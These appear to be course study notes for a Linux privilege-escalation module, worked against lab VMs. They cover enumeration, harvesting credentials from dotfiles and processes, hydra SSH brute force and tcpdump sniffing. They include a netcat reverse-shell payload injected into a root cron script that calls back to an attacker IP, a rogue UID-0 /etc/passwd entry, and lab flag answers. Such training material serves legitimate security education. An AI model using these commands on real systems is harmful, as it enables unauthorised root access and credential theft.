# Linux Privilege Escalation

## Overview

This guide tracks the structure and learning flow for Linux privilege escalation techniques. Detailed walkthroughs will be added in later iterations.

## Table of Contents

- [Learning Module 18: Linux Privilege Escalation](#learning-module-18-linux-privilege-escalation)
  - [Learning Objectives](#learning-objectives)
  - [Learning Units](#learning-units)
    - [Enumerating Linux](#enumerating-linux)
      - [Learning Objectives](#enumerating-linux-learning-objectives)
      - [18.1.1 Understanding Files and Users Privileges on Linux](#1811-understanding-files-and-users-privileges-on-linux)
      - [18.1.2 Manual Enumeration](#1812-manual-enumeration)
      - [18.1.3 Automated Enumeration](#1813-automated-enumeration)
      - [Resources and Labs](#enumerating-linux-resources-and-labs)
    - [Exposed Confidential Information](#exposed-confidential-information)
      - [Learning Objectives](#exposed-confidential-information-learning-objectives)
      - [18.2.1 Inspecting User Trails](#1821-inspecting-user-trails)
      - [18.2.2 Inspecting Service Footprints](#1822-inspecting-service-footprints)
      - [Resources and Labs](#exposed-confidential-information-resources-and-labs)
    - [Insecure File Permissions](#insecure-file-permissions)
      - [Learning Objectives](#insecure-file-permissions-learning-objectives)
      - [18.3.1 Abusing Cron Jobs](#1831-abusing-cron-jobs)
      - [18.3.2 Abusing Password Authentication](#1832-abusing-password-authentication)
      - [Resources and Labs](#insecure-file-permissions-resources-and-labs)
    - [Abusing System Linux Components](#abusing-system-linux-components)
  - [MITRE ATT&CK Context](#mitre-attck-context)
  - [Module Scope and Approach](#module-scope-and-approach)

## Learning Module 18: Linux Privilege Escalation

### Learning Objectives

- Understand how systematic enumeration uncovers misconfigurations and vulnerabilities.
- Recognize how each learning unit contributes to achieving elevated permissions on Linux targets.
- Align observed behaviors with MITRE ATT&CK privilege escalation tactics to aid reporting and detection engineering.

### Learning Units

#### Enumerating Linux

Investigate host details, user contexts, running services, installed packages, and kernel data to build a privilege escalation map.

#### Exposed Confidential Information

Identify sensitive artifacts (keys, credentials, service tokens) that can be leveraged for lateral movement or privilege escalation.

#### Insecure File Permissions

Assess binaries, scripts, and configuration files for writable or misconfigured permissions that enable execution hijacking.

#### Abusing System Linux Components

Target misconfigurations or vulnerabilities in scheduled tasks, system services, or privileged binaries to obtain elevated access.

### MITRE ATT&CK Context

Privilege escalation constitutes a core MITRE ATT&CK tactic in which adversaries seek to leverage user permissions to access restricted resources.

### Module Scope and Approach

This module centers on Linux-based targets. We focus on enumerating Linux machines, defining what constitutes Linux privileges, and highlighting common escalation paths driven by insecure file permissions and misconfigured system components.

## Enumerating Linux

### Enumerating Linux Learning Objectives

- Frame Linux privilege mechanics before attempting exploits.
- Build manual recon habits for bespoke misconfigurations.
- Apply automation to amplify—but not replace—analyst judgment.

### 18.1.1 Understanding Files and Users Privileges on Linux

- Everything is a file: files, dirs, devices, sockets all expose permissions.
- Permission triad per owner/group/others with `r`, `w`, `x`.
- Files: `r` read bytes, `w` edit, `x` execute; directories: `r` list, `w` add/remove, `x` traverse (even blind if names known).
- Command: `ls -l /etc/shadow` → `-rw-r----- 1 root shadow ... /etc/shadow`.
  - First char = type; next six show owner and group perms; final three govern others.
  - Owner `rw-`, group `r--`, others `---`; execute unset, so file cannot run.
- Mastering this readout lets us spot mis-set bits during escalation hunts.

### 18.1.2 Manual Enumeration

- Manual passes surface edge cases automation misses; expect distro-specific adjustments.

#### Identity and Accounts

- `id` after foothold (e.g., SSH as `joe`): `uid=1000(joe) gid=1000(joe) groups=...`; confirms UID/GID plus auxiliary groups.
- `cat /etc/passwd` to list all principals, including service accounts (`www-data`, `sshd`) and interactive users (`joe`, `eve`).
- Field decode: login, placeholder `x` (hash in `/etc/shadow`), UID (root always 0, regular start at 1000), GID, gecos, home, shell. `/usr/sbin/nologin` denotes non-login service accounts.
- Target high-privilege or misconfigured users for next steps.

#### Hostname and OS Fingerprinting

- `hostname` → `debian-privesc`; use naming conventions to infer role.
- `cat /etc/issue`, `cat /etc/os-release`, `uname -a` to nail distro, version, kernel (`Debian 10 buster`, `4.19.0-21-amd64`), and architecture. Precise data is mandatory before launching kernel exploits.
- Treat kernel exploits carefully; test locally when possible to avoid watchdog alerts.

#### Process Recon

- `ps aux` (or `ps axu`) surfaces privileged daemons (`sshd`, `apache2`, `polkitd`, `gdm3`, backup scripts). Correlate with CVE research or config review.
- Filter by user or command to isolate unusual services quickly.

#### Network Surface

- `ip a` to enumerate interfaces, IPs, and loopback bindings; sample host shows `ens192` (192.168.50.0/24) plus `ens224` (172.16.60.0/24), signaling pivot potential.
- `routel` (or `route -n`) to dump routing table; watch for dual gateways, static routes, IPv6 entries.
- `ss -anp` (or `netstat -anp`) to list listeners and sessions: e.g., `0.0.0.0:22`, `*:80`, loopback `127.0.0.1:631`, active SSH session to attack box. Loopback-only services often hide privilege-escalation vectors.

#### Firewall Insight

- Without root, look for persisted rules: `cat /etc/iptables/rules.v4` (default for `iptables-persistent`) or search for `iptables-save` dumps.
- Example snippet exposes explicit allow on TCP 1999; log such anomalies for later use (local port-binding, tunneling).

#### Scheduled Tasks

- `ls -lah /etc/cron*` to inventory system-wide schedules (hourly/daily/weekly/monthly).
- `crontab -l` (current user) and `sudo crontab -l` (root if permitted) to view user-specific jobs; sample root job: `* * * * * /bin/bash /home/joe/.scripts/user_backups.sh`.
- Verify file ownership/permissions (`/home/joe/.scripts`) because writable cron payloads are high-value.

#### Packages and Services

- `dpkg -l` (Debian) or `rpm -qa` (RHEL) lists installed software; confirm versions such as `apache2 2.4.38-3+deb10u7` for targeted CVE matching.
- Combine with open ports to prioritize exploitation research.

#### Writable Paths

- `find / -writable -type d 2>/dev/null` to catch directories the current user can modify beyond home tree.
- Highlight nonstandard writable paths like `/home/joe/.scripts`; cross-reference with cron/systemd jobs.

#### Storage and Mounts

- `cat /etc/fstab` to understand boot-time mounts and options (e.g., root ext4 UUID, swap, CD-ROM autofs entries).
- `mount` for real-time view—detect tempfs, autofs, bind mounts not in `fstab`.
- `lsblk` shows block devices/partitions (`sda1` root, `sda5` swap, `sr0` ISO); unmounted partitions may harbor credentials or backups.

#### Kernel Modules

- `lsmod` to list loaded modules (e.g., `binfmt_misc`, `vmw_balloon`, `libata`).
- `/sbin/modinfo <module>` to capture version, path, deps, signing info (`libata.ko`, `version 3.00`, `vermagic 4.19.0-21-amd64`). Pair with exploit DB for driver-level privilege escalations.

#### Special Permission Bits

- `setuid` / `setgid` bits (`s`) let binaries run with owner/group eUID/eGID (e.g., root), bypassing caller privileges.
- `find / -perm -u=s -type f 2>/dev/null` enumerates SUID binaries (`/usr/bin/passwd`, `pkexec`, `sudo`, `/usr/lib/dbus-1.0/dbus-daemon-launch-helper`, `/usr/sbin/pppd`, etc.).
- Any hijackable SUID-root binary can hand over a root shell; test known abuse chains (GTFOBins, custom payloads).

#### Reference Compendiums

- g0tmi1k Linux privilege escalation checklist.
- PayloadsAllTheThings Linux PrivEsc notes.
- HackTricks Linux PrivEsc chapter for rapid TTP lookup.

### 18.1.3 Automated Enumeration

- Use automation after manual triage to save time and capture broad misconfigs.
- `unix-privesc-check` (Kali: `/usr/bin/unix-privesc-check`) supports `standard` (fast) and `detailed` (slow, deeper). Run without args to view usage.
- Workflow: transfer script → `./unix-privesc-check standard > output.txt` → review highlights (e.g., warning if `/etc/passwd` is world-writable).
- `detailed` mode inspects open file handles and script includes; expect noise but useful for niche paths.
- Complementary tooling: `LinEnum.sh`, `linpeas.sh` (PEASS). Always validate results manually because custom configs may fall outside signatures.
- Document findings immediately so downstream exploitation steps are scoped and reproducible.

### Enumerating Linux Resources and Labs

- Start `Linux Privilege Escalation - Manual Enumeration - VM #1`; lab IPs may differ from guide examples.
- Knowledge checks:
  - Linux distribution codename? → `buster`.
  - `crontab` flag to list current user jobs? → `-l`.
  - Term for inherited privileged UID when running SUID binary? → `SUID`.
  - Flag hunt: enumerate SUID binaries on VM #1; the flag resides inside one of them.
- References: g0tmi1k compendium, PayloadsAllTheThings, HackTricks (Linux PrivEsc).
- Reminder: automation aids but manual verification + local exploit testing remain mandatory.

## Exposed Confidential Information

### Exposed Confidential Information Learning Objectives

- Understand user history/dotfiles as credential sources.
- Harvest credentials from user activity trails.
- Extract secrets from service/system telemetry without crashing hosts.

### 18.2.1 Inspecting User Trails

- Prioritize low-effort wins (history files, dotfiles, exported secrets) before deep exploits.

#### Hidden Artifacts

- `ls -a ~` lists dotfiles (`.bashrc`, `.bash_history`, `.ssh/`); search for creds with `grep -i pass`.
- `tail -n 50 ~/.bash_history` may reveal copy/pasted passwords, tokens, or sudo invocations.

#### Environment Variables

- `env` on the Debian target exposes `SCRIPT_CREDENTIALS=lab` amid other session vars.
```
SCRIPT_CREDENTIALS=lab
USER=joe
...
```
- `cat ~/.bashrc` confirms persistence via `export SCRIPT_CREDENTIALS="lab"`; any new shell loads it.
- Best practice is SSH keys + passphrases, not plaintext exports.

#### Direct Credential Reuse

- `su - root`, supply leaked value → `root@debian-privesc:~# whoami` returns `root`.
- Maintain OPSEC: note source (`.bashrc`) so defenders can remediate.

#### Wordlist Derivation & Brute Force

- Use the leak as a seed for other accounts:
  - `crunch 6 6 -t Lab%%% > wordlist` (min=max=6, pattern `Lab` + 3 digits).
  - `head wordlist` shows `Lab000 ... Lab009 ...`.
- `hydra -l eve -P wordlist 192.168.50.214 -t 4 ssh -V` brute-forces SSH:
```
[ATTEMPT] ... "Lab123"
[22][ssh] host: 192.168.50.214   login: eve   password: Lab123
```
- `ssh eve@192.168.50.214` then provide `Lab123` to land an interactive shell.

#### Privilege Escalation via Eve

- `sudo -l` (inside eve session) discloses `User eve may run the following commands on debian-privesc: (ALL : ALL) ALL`.
- `sudo -i` elevates; `root@debian-privesc:/home/eve# whoami` confirms root context.
- Key idea: single exposed variable can cascade into multi-user compromise.

### 18.2.2 Inspecting Service Footprints

- System daemons and troubleshooting workflows often leak credentials in process listings or packet captures.

#### Process Monitoring

- `watch -n 1 "ps aux | grep -i pass"` snapshots privileged processes every second.
```
root 16880 ... sshpass -p 'Lab123' ssh -t eve@127.0.0.1 'sleep 5;exit'
```
- Even root-owned processes reveal command-line arguments; scrape for `sshpass`, `mysql -p`, etc.

#### Network Sniffing

- Verify sudo rights: `sudo -l` may list `tcpdump` even if shell lacks full root.
- `sudo tcpdump -i lo -A | grep -i pass` captures loopback traffic, prints ASCII payloads:
```
...user:root,pass:lab -
```
- Loopback captures highlight local services blocked externally; sniff before pivoting.
- Reminder: tcpdump needs raw socket access; if delegated, treat as privilege-escalation bridge.

### Exposed Confidential Information Resources and Labs

- Labs:
  - `Linux Privilege Escalation - Inspecting User Trails - VM #1`
  - `Linux Privilege Escalation - Inspecting User Trails - VM #2`
- Knowledge checks:
  - Command to list sudoer capabilities? → `sudo -l`.
  - VM2 flag in another user’s file? → `OS{09e4705ce4743ffa660c6be07ea9b431}`.
- Workflow recap:
  - Enumerate dotfiles/history, leak env secrets.
  - Derive wordlists, brute force adjacent users, chain sudo.
  - Monitor processes/pcaps for service credentials.

## Insecure File Permissions

### Insecure File Permissions Learning Objectives

- Abuse writable scheduled tasks to hijack root execution paths.
- Leverage lax file permissions (e.g., `/etc/passwd`) to mint privileged accounts.

### 18.3.1 Abusing Cron Jobs

- Goal: find root-run cron scripts that reside in user-writable paths, inject payload.

#### Locate Scheduled Task

- `grep "CRON" /var/log/syslog` (or `/var/log/cron.log`) to confirm runtime and owner:
```
Aug 25 04:59:01 debian-privesc CRON[1223]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
```
- Job fires every minute under root, executing `/home/joe/.scripts/user_backups.sh`.

#### Inspect Script and Permissions

- `cat /home/joe/.scripts/user_backups.sh` → simple `cp -rf /home/joe/ /var/backups/joe/`.
- `ls -lah /home/joe/.scripts/user_backups.sh` shows `-rwxrwxrw-` (world-writable). Any local user can edit root-executed script.

#### Weaponize Script

- Append reverse shell (or any root action) while keeping original logic if stealthy:
```
cd ~/.scripts
echo >> user_backups.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_backups.sh
```
- Double-check final payload with `cat user_backups.sh`.

#### Catch Root Shell

- Start listener on attacker box: `nc -lnvp 1234`.
- Wait ≤60s for cron to run; expect connection from target:
```
connect to [192.168.118.2] from 192.168.50.214
# id
uid=0(root) gid=0(root) groups=0(root)
```
- Cleanup after confirming access (restore script, clear logs) if required by ROE.

### 18.3.2 Abusing Password Authentication

- Mis-set permissions on `/etc/passwd` let attackers inject password hashes that override `/etc/shadow`.

#### Generate Hash

- `openssl passwd w00t` → returns `Fdzt.eqJQ4s0g` (algorithm varies by OpenSSL build; DES/MD5 both understood by PAM).

#### Append Privileged Account

- `echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd`.
  - Format: `user:hash:UID:GID:comment:home:shell`.
  - UID/GID `0` grants full root privileges; ensure newline at EOF.

#### Validate Access

- `su root2`, enter plaintext password (`w00t`), then `id` to confirm `uid=0`.
- Remove rogue entry post-testing to avoid stability issues.

#### Notes

- Some modern PAM configs ignore DES hashes—prefer stronger formats if target supports them (`openssl passwd -6` for SHA512).
- Organizations sometimes relax permissions during vendor integrations; always check `ls -l /etc/passwd` and `stat` output early.

### Insecure File Permissions Resources and Labs

- Labs:
  - `Linux Privilege Escalation - Abusing Cron Jobs - VM #1`
  - `Linux Privilege Escalation - Abusing Cron Jobs - VM #2`
- Knowledge checks:
  - Cron log file path referenced above? → `/var/log/syslog` (distros may route to `/var/log/cron.log`).
  - VM2 flag after exploiting cron? → `OS{b267f11a05c207c277ea945f1cb50a9f}`.
- Workflow recap:
  - Enumerate cron/systemd timers + permissions.
  - Inject controlled payloads, collect elevated shells.
  - Audit authentication stores (`/etc/passwd`, `/etc/shadow`, PAM configs) for writable paths.